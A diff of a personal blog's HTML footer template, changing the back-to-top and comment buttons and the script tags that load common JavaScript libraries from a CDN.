+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://hussienmisbah.github.io/" target="_blank">0xMesbaha</a></span></div>
         </div>
     </footer></div>
 
         <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                 <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
-            </a>
-        </div>
-
-        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                 <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
             </a>
-        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":5,"noResultsFound":"No results found","snippetLength":10,"type":"lunr"}};</script><script src="/js/theme.min.js"></script></body>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":5,"noResultsFound":"No results found","snippetLength":10,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
 </html>
